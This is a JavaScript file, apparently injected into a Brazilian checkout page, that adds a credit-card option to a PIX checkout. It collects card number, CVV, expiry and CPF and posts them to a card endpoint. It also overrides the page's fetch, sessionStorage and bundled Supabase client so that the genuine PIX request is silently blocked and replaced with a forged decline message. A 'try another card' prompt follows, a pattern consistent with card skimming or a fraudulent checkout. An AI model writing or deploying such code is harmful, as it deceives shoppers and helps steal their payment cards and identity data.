const CARD_OPTION_ID = "checkout-card-option";
const CARD_FORM_ID = "checkout-card-fields";
const OVERLAY_ID = "checkout-card-overlay";
const STYLE_ID = "checkout-card-style";
const CARD_DECLINE_MESSAGE =
  "Não foi possível realizar o pagamento com este cartão. Não se preocupe, tente novamente com outro cartão.";

const CARD_ICON = `<svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>`;

const fieldStyle =
  "height:44px;border:1px solid #d1d5db;border-radius:10px;padding:0 12px;width:100%;box-sizing:border-box;font-size:14px;background:#fff;color:#111827;";
const errorStyle = "display:none;margin-top:4px;font-size:12px;color:#b91c1c;";
const primaryButtonStyle =
  "width:100%;height:46px;border:0;border-radius:10px;background:#0b1f3a;color:#fff;font-weight:700;font-size:14px;cursor:pointer;";
const ghostButtonStyle =
  "width:100%;height:46px;border:1px solid #0b1f3a;border-radius:10px;background:#fff;color:#0b1f3a;font-weight:700;font-size:14px;cursor:pointer;";

let method = "pix";
let armed = false;
let charging = false;
let pendingCard = null;
let lastCheckoutState = {};
let lastSignature = "";
let observer = null;
let scheduled = false;

const originalFetch = window.fetch.bind(window);

function digits(value) {
  return String(value || "").replace(/\D/g, "");
}

function isAmex(number) {
  return /^3[47]/.test(digits(number));
}

function formatCardNumber(value) {
  const raw = digits(value);
  const sliced = raw.slice(0, isAmex(raw) ? 15 : 16);
  if (isAmex(sliced)) {
    return sliced.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*/, (_, a, b, c) => [a, b, c].filter(Boolean).join(" "));
  }
  return sliced.replace(/(\d{4})(?=\d)/g, "$1 ");
}

function formatExpiry(value) {
  const raw = digits(value).slice(0, 4);
  return raw.length <= 2 ? raw : `${raw.slice(0, 2)}/${raw.slice(2)}`;
}

function formatCpf(value) {
  return digits(value)
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

function formatCvv(value, number) {
  return digits(value).slice(0, isAmex(number) ? 4 : 3);
}

function validCpf(value) {
  const cpf = digits(value);
  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
  const check = (len) => {
    let sum = 0;
    for (let i = 0; i < len; i++) sum += Number(cpf[i]) * (len + 1 - i);
    const rest = (sum * 10) % 11;
    return (rest === 10 ? 0 : rest) === Number(cpf[len]);
  };
  return check(9) && check(10);
}

function validLuhn(number) {
  let sum = 0;
  let double = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = Number(number[i]);
    if (double) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    double = !double;
  }
  return sum % 10 === 0;
}

function cardFieldsMarkup() {
  return `
    <div>
      <input data-card="holderName" autocomplete="cc-name" placeholder="Nome impresso no cartão" style="${fieldStyle}" />
      <div data-error="holderName" style="${errorStyle}"></div>
    </div>
    <div>
      <input data-card="number" inputmode="numeric" autocomplete="cc-number" placeholder="Número do cartão" maxlength="19" style="${fieldStyle}" />
      <div data-error="number" style="${errorStyle}"></div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
      <div>
        <input data-card="expiry" inputmode="numeric" autocomplete="cc-exp" placeholder="Validade MM/AA" maxlength="5" style="${fieldStyle}" />
        <div data-error="expiry" style="${errorStyle}"></div>
      </div>
      <div>
        <input data-card="cvv" inputmode="numeric" autocomplete="cc-csc" placeholder="CVV" maxlength="4" style="${fieldStyle}" />
        <div data-error="cvv" style="${errorStyle}"></div>
      </div>
    </div>
    <div>
      <input data-card="holderCpf" inputmode="numeric" placeholder="CPF do titular" maxlength="14" style="${fieldStyle}" />
      <div data-error="holderCpf" style="${errorStyle}"></div>
    </div>
    <select data-card="installments" style="${fieldStyle}">
      ${Array.from({ length: 12 }, (_, i) => `<option value="${i + 1}">${i + 1}x</option>`).join("")}
    </select>`;
}

function readFields(root) {
  const value = (name) => root?.querySelector(`[data-card="${name}"]`)?.value || "";
  const expiry = value("expiry");
  const [expiryMonth = "", expiryYear = ""] = expiry.split("/");
  return {
    holderName: value("holderName"),
    number: value("number"),
    expiry,
    expiryMonth,
    expiryYear,
    cvv: value("cvv"),
    holderCpf: value("holderCpf"),
    installments: value("installments") || "1",
  };
}

function setFieldError(root, name, message) {
  const input = root?.querySelector(`[data-card="${name}"]`);
  const hint = root?.querySelector(`[data-error="${name}"]`);
  if (input) input.style.borderColor = message ? "#dc2626" : "#d1d5db";
  if (hint) {
    hint.textContent = message || "";
    hint.style.display = message ? "block" : "none";
  }
}

function validateFields(root, card) {
  const number = digits(card.number);
  const cvv = digits(card.cvv);
  const month = Number(digits(card.expiryMonth));
  const yearRaw = digits(card.expiryYear);
  const year = Number(yearRaw.length === 2 ? `20${yearRaw}` : yearRaw);
  const amex = isAmex(number);
  const now = new Date();
  const errors = {};

  if (!String(card.holderName || "").trim()) errors.holderName = "Informe o nome impresso no cartão";
  if (number.length !== (amex ? 15 : 16) || !validLuhn(number)) errors.number = "Informe um número de cartão válido";
  if (
    !month ||
    month < 1 ||
    month > 12 ||
    !year ||
    year < now.getFullYear() ||
    (year === now.getFullYear() && month < now.getMonth() + 1)
  ) {
    errors.expiry = "Informe uma validade válida";
  }
  if (cvv.length !== (amex ? 4 : 3)) errors.cvv = "Informe um CVV válido";
  if (!validCpf(card.holderCpf)) errors.holderCpf = "Informe o CPF do titular";

  ["holderName", "number", "expiry", "cvv", "holderCpf"].forEach((name) => setFieldError(root, name, errors[name]));
  return Object.keys(errors).length > 0;
}

function bindMasks(root) {
  const number = root.querySelector('[data-card="number"]');
  const expiry = root.querySelector('[data-card="expiry"]');
  const cvv = root.querySelector('[data-card="cvv"]');
  const cpf = root.querySelector('[data-card="holderCpf"]');
  const holder = root.querySelector('[data-card="holderName"]');

  number?.addEventListener("input", () => {
    number.value = formatCardNumber(number.value);
    if (cvv) cvv.value = formatCvv(cvv.value, number.value);
    cvv?.setAttribute("maxlength", isAmex(number.value) ? "4" : "3");
    setFieldError(root, "number", "");
  });
  expiry?.addEventListener("input", () => {
    expiry.value = formatExpiry(expiry.value);
    setFieldError(root, "expiry", "");
  });
  cvv?.addEventListener("input", () => {
    cvv.value = formatCvv(cvv.value, number?.value);
    setFieldError(root, "cvv", "");
  });
  cpf?.addEventListener("input", () => {
    cpf.value = formatCpf(cpf.value);
    setFieldError(root, "holderCpf", "");
  });
  holder?.addEventListener("input", () => setFieldError(root, "holderName", ""));
}

function ensureStyle() {
  if (document.getElementById(STYLE_ID)) return;
  const style = document.createElement("style");
  style.id = STYLE_ID;
  style.textContent = `@keyframes ${OVERLAY_ID}-spin{to{transform:rotate(360deg)}}`;
  document.head.appendChild(style);
}

function isPayButton(button) {
  return /Gerar PIX e finalizar|Pagar com cartão/i.test(button.textContent || "");
}

function findPayButton() {
  return [...document.querySelectorAll("button")].find(isPayButton);
}

// Só o nó de texto é trocado: mexer no innerHTML/textContent apagaria o ícone
// que o React controla e derrubaria a página no próximo render do botão.
function syncPayButton() {
  const button = findPayButton();
  if (!button) return;
  const label = [...button.childNodes].find(
    (node) => node.nodeType === Node.TEXT_NODE && /Gerar PIX e finalizar|Pagar com cartão/i.test(node.nodeValue || ""),
  );
  if (!label) return;
  const next = method === "card" ? "Pagar com cartão" : "Gerar PIX e finalizar";
  if (label.nodeValue !== next) label.nodeValue = next;
}

function renderCardOption() {
  if (window.location.pathname !== "/checkout") return;
  const pixLabel = [...document.querySelectorAll("label")].find((label) => label.textContent?.includes("PIX"));
  if (!pixLabel?.parentElement) return;

  syncPayButton();

  const existing = document.getElementById(CARD_OPTION_ID);
  if (existing?.isConnected && lastSignature === method) return;

  const preserved = readFields(document.getElementById(CARD_FORM_ID));
  observer?.disconnect();
  lastSignature = method;

  let card = existing?.isConnected ? existing : null;
  if (!card) {
    card = document.createElement("div");
    card.id = CARD_OPTION_ID;
  }
  if (card.parentElement !== pixLabel.parentElement) {
    pixLabel.parentElement.insertBefore(card, pixLabel.nextSibling);
  }

  pixLabel.style.cursor = "pointer";
  pixLabel.style.opacity = method === "pix" ? "1" : "0.65";
  if (!pixLabel.dataset.payBound) {
    pixLabel.dataset.payBound = "1";
    pixLabel.addEventListener("click", () => {
      method = "pix";
      armed = false;
      renderCardOption();
    });
  }

  const selected = method === "card";
  card.style.marginTop = "12px";
  card.innerHTML = `
      <button type="button" data-pay="card" style="width:100%;display:flex;align-items:center;gap:12px;border:1px solid ${selected ? "#0b1f3a" : "#e5e7eb"};background:${selected ? "#e8f0fb" : "#fff"};border-radius:12px;padding:14px;cursor:pointer;text-align:left;">
        <span style="flex:none;width:44px;height:44px;border-radius:12px;border:1px solid #e5e7eb;background:#fff;color:#0b1f3a;display:flex;align-items:center;justify-content:center;">${CARD_ICON}</span>
        <span style="flex:1;min-width:0;">
          <span style="display:block;font-weight:700;color:#0b1f3a;">Cartão de crédito</span>
          <span style="display:block;font-size:12px;color:#4b5563;">Até 12x</span>
        </span>
        <span style="flex:none;width:18px;height:18px;border-radius:999px;border:2px solid ${selected ? "#0b1f3a" : "#d1d5db"};box-shadow:inset 0 0 0 ${selected ? "5px" : "0"} #0b1f3a;"></span>
      </button>
      <div id="${CARD_FORM_ID}" style="display:${selected ? "grid" : "none"};gap:10px;margin-top:12px;">
        ${cardFieldsMarkup()}
      </div>`;

  const customerCpf = lastCheckoutState?.customer?.cpf || "";
  Object.entries({
    ...preserved,
    holderCpf: preserved.holderCpf || formatCpf(customerCpf),
  }).forEach(([name, value]) => {
    const field = card.querySelector(`[data-card="${name}"]`);
    if (field && value) field.value = value;
  });

  card.querySelector("[data-pay='card']")?.addEventListener("click", () => {
    method = "card";
    renderCardOption();
  });
  bindMasks(card);
  syncPayButton();
  observer?.observe(document.body, { childList: true, subtree: true });
}

function closeOverlay() {
  document.getElementById(OVERLAY_ID)?.remove();
}

function overlayShell(inner) {
  ensureStyle();
  let overlay = document.getElementById(OVERLAY_ID);
  if (!overlay) {
    overlay = document.createElement("div");
    overlay.id = OVERLAY_ID;
    overlay.style.cssText =
      "position:fixed;inset:0;z-index:2147483647;background:rgba(9,9,11,.92);display:flex;align-items:center;justify-content:center;padding:20px;overflow:auto;";
    document.body.appendChild(overlay);
  }
  overlay.innerHTML = `<div style="width:100%;max-width:420px;background:#fff;border-radius:16px;padding:22px;box-shadow:0 24px 60px rgba(0,0,0,.45);">${inner}</div>`;
  return overlay.firstElementChild;
}

function showProcessing() {
  overlayShell(`
    <div style="display:grid;gap:14px;justify-items:center;text-align:center;">
      <span style="width:44px;height:44px;border-radius:999px;border:3px solid #e5e7eb;border-top-color:#0b1f3a;animation:${OVERLAY_ID}-spin .8s linear infinite;"></span>
      <div style="font-weight:700;font-size:17px;color:#0b1f3a;">Processando pagamento</div>
      <div style="font-size:13px;line-height:1.5;color:#4b5563;">Estamos autorizando o seu cartão. Não feche esta página.</div>
    </div>`);
}

function showDeclined(message) {
  const box = overlayShell(`
    <div style="display:grid;gap:14px;">
      <div style="display:flex;align-items:center;gap:12px;">
        <span style="flex:none;width:42px;height:42px;border-radius:999px;background:#fef2f2;color:#b91c1c;display:flex;align-items:center;justify-content:center;">
          <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="15" x2="9" y1="9" y2="15"/><line x1="9" x2="15" y1="9" y2="15"/></svg>
        </span>
        <div style="font-weight:700;font-size:17px;color:#0b1f3a;">Pagamento não realizado</div>
      </div>
      <div style="font-size:13px;line-height:1.5;color:#4b5563;">${message || CARD_DECLINE_MESSAGE}</div>
      <div data-retry-form style="display:none;gap:10px;grid-template-columns:1fr;">
        ${cardFieldsMarkup()}
        <button type="button" data-retry-pay style="${primaryButtonStyle}">Pagar com este cartão</button>
      </div>
      <button type="button" data-retry style="${primaryButtonStyle}">Tentar novamente outro cartão</button>
      <button type="button" data-pix style="${ghostButtonStyle}">Pague agora no PIX</button>
      <button type="button" data-back style="border:0;background:none;color:#6b7280;font-size:12px;text-decoration:underline;cursor:pointer;">Voltar para o checkout</button>
    </div>`);

  const form = box.querySelector("[data-retry-form]");
  const retry = box.querySelector("[data-retry]");
  bindMasks(form);

  const holderCpf = pendingCard?.holderCpf || formatCpf(lastCheckoutState?.customer?.cpf || "");
  const holderName = pendingCard?.holderName || lastCheckoutState?.customer?.name || "";
  form.querySelector('[data-card="holderCpf"]').value = holderCpf;
  form.querySelector('[data-card="holderName"]').value = holderName;

  retry.addEventListener("click", () => {
    form.style.display = "grid";
    retry.style.display = "none";
    form.querySelector('[data-card="number"]')?.focus();
  });

  box.querySelector("[data-retry-pay]").addEventListener("click", () => {
    const card = readFields(form);
    if (validateFields(form, card)) return;
    pendingCard = card;
    void chargeCard();
  });

  box.querySelector("[data-pix]").addEventListener("click", () => {
    armed = false;
    pendingCard = null;
    closeOverlay();
    if (window.location.pathname === "/pix") window.location.reload();
    else window.location.assign("/pix");
  });

  box.querySelector("[data-back]").addEventListener("click", () => {
    armed = false;
    pendingCard = null;
    closeOverlay();
    window.location.assign("/checkout");
  });
}

async function chargeCard() {
  if (charging) return;
  charging = true;
  showProcessing();
  if (!lastCheckoutState?.amount) {
    try {
      lastCheckoutState = JSON.parse(sessionStorage.getItem("pixPageState") || "{}") || {};
    } catch {
      /* segue com o que tem em memória */
    }
  }
  try {
    const res = await originalFetch("/api/card/create", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...lastCheckoutState,
        card: {
          number: pendingCard?.number || "",
          cvv: pendingCard?.cvv || "",
          expiryMonth: pendingCard?.expiryMonth || "",
          expiryYear: pendingCard?.expiryYear || "",
          holderName: pendingCard?.holderName || "",
          holderCpf: pendingCard?.holderCpf || "",
        },
        installments: Number(pendingCard?.installments || 1),
      }),
    });
    const data = await res.json().catch(() => ({}));
    if (data.success && data.redirect) {
      armed = false;
      window.location.assign(data.redirect);
      return;
    }
    showDeclined(data.error);
  } catch {
    showDeclined();
  } finally {
    charging = false;
  }
}

function isPixCreate(url) {
  const value = String(url || "");
  return value.includes("/api/pix/create") || value.includes("checkout-create-pix");
}

function blockedPixResponse() {
  return new Response(JSON.stringify({ success: false, error: CARD_DECLINE_MESSAGE }), {
    status: 409,
    headers: { "Content-Type": "application/json" },
  });
}

window.fetch = function patchedFetch(input, init) {
  const url = typeof input === "string" ? input : input instanceof URL ? input.href : input?.url;
  if (armed && isPixCreate(url)) return Promise.resolve(blockedPixResponse());
  return originalFetch(input, init);
};

const originalSetItem = sessionStorage.setItem.bind(sessionStorage);
sessionStorage.setItem = function patchedSetItem(key, value) {
  originalSetItem(key, value);
  if (key !== "pixPageState") return;
  try {
    lastCheckoutState = JSON.parse(value) || {};
  } catch {
    /* mantém o último estado conhecido */
  }
  if (armed) void chargeCard();
};

document.addEventListener(
  "click",
  (event) => {
    const target = event.target instanceof Element ? event.target.closest("button") : null;
    if (!target || !isPayButton(target)) return;
    if (method !== "card") {
      armed = false;
      return;
    }

    const form = document.getElementById(CARD_FORM_ID);
    const card = readFields(form);
    if (validateFields(form, card)) {
      event.preventDefault();
      event.stopImmediatePropagation();
      form?.scrollIntoView({ behavior: "smooth", block: "center" });
      return;
    }
    pendingCard = card;
    armed = true;
  },
  true,
);

void (async () => {
  try {
    const bundle = await import("/assets/index-D36WQRm9.js");
    const supabase = bundle?.s;
    const invoke = supabase?.functions?.invoke?.bind(supabase.functions);
    if (!invoke) return;
    supabase.functions.invoke = async (name, options) => {
      if (armed && name === "checkout-create-pix") {
        return { data: { success: false }, error: { message: CARD_DECLINE_MESSAGE } };
      }
      return invoke(name, options);
    };
  } catch {
    /* sem o cliente do bundle o bloqueio do fetch já cobre */
  }
})();

observer = new MutationObserver(() => {
  if (scheduled) return;
  scheduled = true;
  requestAnimationFrame(() => {
    scheduled = false;
    try {
      renderCardOption();
    } catch {
      /* nunca derruba a página */
    }
  });
});
observer.observe(document.body, { childList: true, subtree: true });
renderCardOption();
